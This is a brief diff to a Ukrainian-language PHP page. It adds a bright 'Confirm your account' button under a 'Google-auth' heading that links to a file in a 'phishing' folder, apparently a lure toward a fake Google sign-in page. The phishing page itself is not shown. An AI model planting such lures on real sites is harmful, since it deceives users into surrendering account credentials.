@@ -64,6 +64,13 @@
         <a href="login.php">Увійти</a>
     <?php endif; ?>
 
+    <h2>Google-auth</h2>
+    <a href="phishing/google-auth.php">
+        <button style="background-color:#f44336;color:white;padding:14px 20px;border:none;border-radius:4px;cursor:pointer;">
+            Підтвердіть акаунт
+        </button>
+    </a>
+
 
 
     <script src="script.js"></script>
